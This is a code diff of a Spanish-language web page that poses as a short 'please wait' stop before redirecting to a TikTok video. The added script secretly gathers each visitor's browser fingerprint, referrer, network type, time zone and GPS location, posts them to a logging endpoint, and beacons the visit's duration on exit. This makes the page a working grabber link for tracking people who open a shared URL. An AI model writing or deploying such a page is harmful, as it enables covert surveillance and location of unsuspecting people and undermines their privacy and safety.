@@ -2,25 +2,77 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Recolección</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Recolección Mejorada</title>
 </head>
 <body>
+  <p>Espere un momento...</p>
+
   <script>
-    // Enviar los datos
-    fetch('/api/registro', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
+    // Obtener coordenadas GPS
+    function obtenerCoordenadas() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve(null);
+          return;
+        }
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+          err => resolve(null),
+          { timeout: 5000 }
+        );
+      });
+    }
+
+    // Obtener tipo de red
+    function obtenerTipoRed() {
+      const nav = navigator;
+      if ('connection' in nav) {
+        return nav.connection.effectiveType || nav.connection.type || null;
+      }
+      return null;
+    }
+
+    async function enviarRegistro() {
+      const horaInicio = Date.now();
+
+      const datos = {
         navegador: navigator.userAgent,
-        nombre: 'Visitante'
-      })
-    }).finally(() => {
-      // Redirigir después de registrar
-      window.location.href = 'https://www.tiktok.com/@reyganzo69/video/7482119548657732870?is_from_webapp=1&sender_device=pc';
-    });
+        idioma: navigator.language,
+        plataforma: navigator.platform,
+        resolucion: `${screen.width}x${screen.height}`,
+        referrer: document.referrer,
+        coords: await obtenerCoordenadas(),
+        tipoRed: obtenerTipoRed(),
+        zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Desconocida',
+        nombre: 'Visitante',
+        ubicacion: '',
+        duracion: 0
+      };
+
+      // Enviar registro inicial
+      await fetch('/api/registro', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(datos),
+      });
+
+      // Enviar duración al salir
+      window.addEventListener('beforeunload', () => {
+        const duracionSegundos = Math.floor((Date.now() - horaInicio) / 1000);
+        datos.duracion = duracionSegundos;
+
+        navigator.sendBeacon('/api/registro', JSON.stringify(datos));
+      });
+
+      // Redirigir después de 1 segundo
+      setTimeout(() => {
+        window.location.href = 'https://www.tiktok.com/@reyganzo69/video/74821195';
+      }, 1000);
+    }
+
+    enviarRegistro();
   </script>
-  <p>Recolectando visita...</p>
 </body>
 </html>
 
